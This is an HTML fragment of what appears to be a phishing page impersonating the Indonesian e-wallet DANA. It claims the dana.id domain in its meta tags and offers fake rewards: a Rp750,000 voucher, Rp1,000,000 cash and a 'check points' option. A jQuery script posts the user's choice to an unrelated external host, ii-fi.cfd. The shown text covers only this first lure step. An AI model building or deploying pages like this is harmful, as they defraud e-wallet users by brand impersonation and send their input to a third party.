...
<head>
 <meta charset="UTF-8">
  ...
  <meta property="og:title" content="𝗗𝗮𝗻𝗮 𝗧𝘂𝗸𝗮𝗿 𝗣𝗢𝗜𝗡">
 ...
 <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNxuzA7fuW5aFVzMu9EP1nufSGbJoR-sKP1Y3ULQhyphenhyphen3Eajm8qUHsbyVQCO0grL40EnHgzrSJwMwM_O-2lADHc-_sg1r0BXy9qyjJAxqIzqcBsTvczuepNjf9MvbyAY37CJ8g53hTcpgZIseJYlEPSYhJzBPmOlqP8Fwbzh0XpNNtubZNdqiH2p5mvKFBI/s720/IMG-20241031-WA0114.jpg" property="og:image">
  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="https://www.dana.id">
  <meta property="twitter:url" content="https://www.dana.id">
  <meta name="twitter:title" content="𝗗𝗮𝗻𝗮 𝗧𝘂𝗸𝗮𝗿 𝗣𝗢𝗜𝗡">
...
<center>
 <img id="video"
  ...
  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; z-index: -2" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhje2m8REPpE41h480A5laJydDpVlgFIc2FGh0tKmC1EcuOSF7MliAZEWxfGSUG_64CjYEQbEAMmcrWAnelwNNhMOrasWbVHg5I6gAksKSF3GS0aNof-Zob1_5WaAndu66PnHqaQHtwZ2ntNoXPUVoRgykTH3Aak1HG50Z7s0xgGVwsSvsBXT1037V4TLQ/s960/Dana%20indonesia-min.gif" type="img/jpeg">
<br/>
...
<center>
<!-- partial:index.partial.html -->
<form style="margin-top: -20px; height: 50px; padding-top: 15px; margin-bottom: 0px; text-align: center; font-size: 15px; background: #118EEA; color: #fff; border-radius: 15px 15px 0px 0px; border: 2px solid #fff; margin: 0px auto; margin-top: -20px;width: 310px">
    <div style="margin-left: 0px; margin-top: -7px; font-weight: bold">𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗼𝗶𝗻 𝗔𝗻𝗱𝗮 𝗗𝗶𝗯𝗮𝘄𝗮𝗵</div>

 </form>   

 
<form id="patok" style="margin-top: -60px; border-top: 1px solid #ccc; height: 150px; text-align: center; background: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUCd3FTNPsfV4I_egK0UaUXzClscz5eacLow&usqp=CAU);
    background-position: 100% 100%;
    background-size: 100% 100%; background-color: #fff; outline: 1px solid #118EEA; text-shadow: 0 0.5px 0.5px rgba(000, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; font-size: 12px; color: #fff; width: 310px">
    
<label class="aha">
       <input type="radio" id="btn1" name="tarif" value="𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗕𝗲𝗹𝗮𝗻𝗷𝗮 𝗥𝗽.𝟳𝟱𝟬.𝟬𝟬𝟬" onclick="letsgo1()"/>
    <span class="s">𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗕𝗲𝗹𝗮𝗻𝗷𝗮 𝗥𝗽.𝟳𝟱𝟬.𝟬𝟬𝟬</span>
		</label>
<label class="aha">
       <input type="radio" id="btn2" name="tarif" value="𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 𝗥𝗽.𝟭.𝟬𝟬𝟬.𝟬𝟬𝟬" onclick="letsgo1()"/>
    <span class="s">𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 𝗥𝗽.𝟭.𝟬𝟬𝟬.𝟬𝟬𝟬</span>
		</label>
<label class="aha">
       <input type="radio" id="btn3" name="tarif" value="𝗖𝗲𝗸 𝗣𝗼𝗶𝗻 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶" onclick="letsgo1()"/>
    <span class="s">𝗖𝗲𝗸 𝗣𝗼𝗶𝗻 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶</span>
		</label>
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/c7he/ii/tarif.php',
